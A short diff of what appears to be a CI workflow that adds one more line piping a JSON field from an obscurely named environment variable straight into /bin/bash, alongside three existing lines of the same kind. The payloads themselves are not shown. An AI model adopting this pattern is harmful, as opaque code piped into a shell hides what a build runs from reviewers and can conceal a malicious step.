@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$e8" | jq -r .d7 | /bin/bash
           echo $kaghf5954 | jq -r .jzogr0 | /bin/bash
           echo $svfa57 | jq -r .lsial7451 | /bin/bash
+          echo $ad9 | jq -r .ugq50 | /bin/bash
 
       - name: Store results
         if: always()
